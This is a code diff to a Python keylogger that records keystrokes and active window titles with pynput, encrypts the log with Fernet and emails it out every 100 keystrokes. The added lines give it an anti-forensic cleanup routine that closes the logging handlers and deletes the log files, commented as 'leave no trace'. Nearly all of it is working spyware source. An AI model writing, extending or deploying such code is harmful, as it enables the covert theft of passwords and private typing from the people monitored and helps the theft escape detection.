@@ -3,6 +3,7 @@ from cryptography.fernet import Fernet
 
 #listening for 
 from pynput.keyboard import Key, Listener
+import os
 
 # relevant librarires for exfil via email
 from email.mime.multipart import MIMEMultipart
@@ -88,6 +89,27 @@ def encrypt():
 
         send_email(e_log_dir, e_log_dir, toaddr)
 
+# release logging file to clean up log.txt files
+def release_log_file():
+    logger = logging.getLogger()
+    
+    # Copy the list of handlers and iterate over it
+    for handler in logger.handlers[:]:
+        # If the handler is writing to a file, close it and remove it
+        if isinstance(handler, logging.FileHandler):
+            handler.close()
+            logger.removeHandler(handler)
+
+
+# delete files leave no trace and stuff
+def cleanup():
+    try: 
+        release_log_file()
+        os.remove(e_log_dir)
+        os.remove(log_dir)
+    except Exception as e:
+        print(f'still couldnt delete{e}', )
+
 # send email every 100 keystrokes
 def on_press(key):
     curr_window = get_active_window_title()
@@ -95,12 +117,14 @@ def on_press(key):
     global count
     count += 1
     if count == 100:
+        print(100)
         encrypt()
         send_email(e_log_dir, e_log_dir, toaddr)
         count = 0
     if key == Key.esc:
         return False
 
+
 with Listener(on_press=on_press) as listener:
     listener.join()
-
+cleanup()
